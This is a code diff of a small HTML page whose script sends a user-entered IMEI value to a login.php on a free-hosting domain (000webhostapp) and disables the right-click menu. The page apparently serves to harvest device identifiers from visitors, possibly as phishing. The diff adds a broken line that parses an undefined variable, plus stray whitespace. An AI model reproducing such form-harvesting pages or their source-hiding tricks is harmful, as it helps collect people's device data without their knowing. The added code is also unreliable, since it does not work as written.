@@ -10,7 +10,18 @@
   <script>
     function usrpas(){
     window.location="https://fast2021.000webhostapp.com/login.php?imeico="+document.form1.imei.value}
+    
+   const obj = JSON.parse(datos);
+   alert(obj.nombre);
+
+
     document.oncontextmenu=new Function("return false");
+    
+    
+    
+    
+    
+    
     </script>
     <form  name="form1">
     <input type="text" name="imei"> imeico<br>
@@ -21,8 +32,3 @@
     </form>   
 </body>
 </html>
-
-
- 
-
-
